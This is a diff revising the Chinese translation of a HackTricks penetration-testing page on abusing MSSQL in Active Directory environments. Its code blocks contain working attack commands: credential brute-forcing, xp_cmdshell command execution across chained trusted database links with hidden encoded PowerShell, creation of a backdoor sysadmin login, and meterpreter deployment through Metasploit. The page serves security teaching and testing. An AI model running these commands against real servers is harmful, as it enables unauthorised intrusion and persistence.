@@ -1,4 +1,4 @@
-# MSSQL AD Abuse
+# MSSQL AD 利用
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -7,7 +7,7 @@
 
 ### Python
 
-[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) 工具基于 impacket，允许使用 kerberos 票证进行身份验证，并通过链接链进行攻击。
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) 工具基于 impacket，还支持使用 Kerberos tickets 进行 authenticate，并通过 link chains 发起攻击
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### 在没有域会话的情况下从网络枚举
+### 在没有 domain session 的情况下从网络进行枚举
 ```
 
 # Interactive mode
@@ -90,11 +90,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-在这种情况下，powershell 模块 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 非常有用。
+Powershell 模块 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 在这种情况下非常有用。
 ```bash
 Import-Module .\PowerupSQL.psd1
 ````
-### 在没有域会话的情况下从网络枚举
+### 在没有 domain session 的情况下从网络进行 Enumerating
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -108,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### 从域内部枚举
+### 从域内进行枚举
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -133,7 +133,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL 基本滥用
+## MSSQL 基础滥用
 
 ### 访问数据库
 ```bash
@@ -161,27 +161,27 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-这也可能在 MSSQL 主机内部 **执行命令**。
+也可能在 MSSQL 主机内**执行命令**
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-检查**以下部分中提到的页面以手动执行此操作。**
+查看**以下部分**提到的页面，了解如何手动执行此操作。
 
-### MSSQL 基本黑客技巧
+### MSSQL Basic Hacking Tricks
 
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL 受信任链接
+## MSSQL Trusted Links
 
-如果一个 MSSQL 实例被另一个 MSSQL 实例信任（数据库链接）。如果用户对受信任的数据库拥有权限，他将能够**利用信任关系在另一个实例中执行查询**。这些信任可以链式连接，在某些情况下，用户可能能够找到一些配置错误的数据库，在那里他可以执行命令。
+如果某个 MSSQL 实例受到另一个 MSSQL 实例的信任（数据库链接），并且用户对受信任的数据库拥有权限，那么他将能够**利用信任关系在另一个实例中执行查询**。这些信任关系可以进行链式连接，用户最终可能找到某个配置错误的数据库，并在其中执行命令。
 
-**数据库之间的链接甚至可以跨森林信任工作。**
+**数据库之间的链接即使跨越 forest trusts 也能正常工作。**
 
-### Powershell 滥用
+### Powershell Abuse
 ```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -213,7 +213,7 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-另一个可以使用的类似工具是 [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+另一个可以使用的类似工具是 [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn)：
 ```bash
 SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
 # Cobalt Strike
@@ -221,43 +221,43 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-您可以使用 metasploit 轻松检查受信任的链接。
+你可以使用 metasploit 轻松检查受信任的链接。
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-注意，metasploit 只会尝试滥用 MSSQL 中的 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您将需要尝试 **手动** 使用 `EXECUTE` 方法来执行命令，更多信息见下文。）
+注意，metasploit 只会尝试利用 MSSQL 中的 `openquery()` 函数（因此，如果你无法使用 `openquery()` 执行命令，就需要手动尝试 `EXECUTE` 方法来执行命令，详见下文。）
 
 ### 手动 - Openquery()
 
-从 **Linux** 您可以使用 **sqsh** 和 **mssqlclient.py** 获取 MSSQL 控制台 shell。
+在 **Linux** 中，你可以使用 **sqsh** 和 **mssqlclient.py** 获取 MSSQL 控制台 shell。
 
-从 **Windows** 您也可以找到链接并使用 **MSSQL 客户端如** [**HeidiSQL**](https://www.heidisql.com) 手动执行命令。
+在 **Windows** 中，你也可以查找链接，并使用类似 [**HeidiSQL**](https://www.heidisql.com) 这样的 **MSSQL client** 手动执行命令。
 
-_使用 Windows 身份验证登录：_
+_使用 Windows authentication 登录：_
 
-![](<../../images/image (808).png>)
+![Metasploit - 手动 - Openquery()：使用 Windows authentication 登录](<../../images/image (808).png>)
 
 #### 查找可信链接
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../images/image (716).png>)
+![Manual - Openquery() - 查找可信链接：EXEC sp linkedservers;](<../../images/image (716).png>)
 
-#### 在可信链接中执行查询
+#### 通过可信链接执行查询
 
-通过链接执行查询（示例：在新的可访问实例中查找更多链接）：
+通过链接执行查询（例如：在新访问的实例中查找更多链接）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> 检查双引号和单引号的使用方式，正确使用它们非常重要。
+> 检查双引号和单引号的使用位置，必须确保使用方式正确。
 
-![](<../../images/image (643).png>)
+![查找可信链接 - 在可信链接中执行查询：检查双引号和单引号的使用位置，必须确保使用方式正确](<../../images/image (643).png>)
 
-您可以手动无限制地继续这些受信任链接的链条。
+你可以手动无限延续这些可信链接链。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -265,11 +265,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-如果您无法通过 `openquery()` 执行像 `exec xp_cmdshell` 这样的操作，请尝试使用 `EXECUTE` 方法。
+如果无法通过 `openquery()` 执行 `exec xp_cmdshell` 等操作，请尝试使用 `EXECUTE` 方法。
 
 ### 手动 - EXECUTE
 
-您还可以使用 `EXECUTE` 滥用受信任的链接：
+你也可以使用 `EXECUTE` abuse trusted links：
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -277,16 +277,16 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## 本地权限提升
 
-**MSSQL 本地用户** 通常具有一种特殊类型的权限，称为 **`SeImpersonatePrivilege`**。这允许该账户在身份验证后“模拟客户端”。
+**MSSQL local user** 通常拥有一种特殊类型的权限，称为 **`SeImpersonatePrivilege`**。该权限允许账户“在身份验证后模拟客户端”。
 
-许多作者提出的一种策略是强制 SYSTEM 服务向攻击者创建的恶意或中间人服务进行身份验证。这个恶意服务能够在 SYSTEM 服务尝试进行身份验证时模拟该服务。
+许多作者提出的一种策略是，强制某个 SYSTEM 服务向攻击者创建的 rogue 或 man-in-the-middle 服务进行身份验证。随后，该 rogue 服务便能够在 SYSTEM 服务尝试进行身份验证时对其进行模拟。
 
-[SweetPotato](https://github.com/CCob/SweetPotato) 收集了这些可以通过 Beacon 的 `execute-assembly` 命令执行的各种技术。
+[SweetPotato](https://github.com/CCob/SweetPotato) 收集了多种此类技术，可通过 Beacon 的 `execute-assembly` 命令执行。
 
 
 
-### SCCM 管理点 NTLM 中继 (OSD 秘密提取)
-查看 SCCM **管理点** 的默认 SQL 角色如何被滥用，以直接从站点数据库中转储网络访问账户和任务序列秘密：
+### SCCM Management Point NTLM Relay（OSD Secret Extraction）
+了解如何滥用 SCCM **Management Points** 的默认 SQL 角色，直接从站点数据库中导出 Network Access Account 和 Task-Sequence secrets：
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
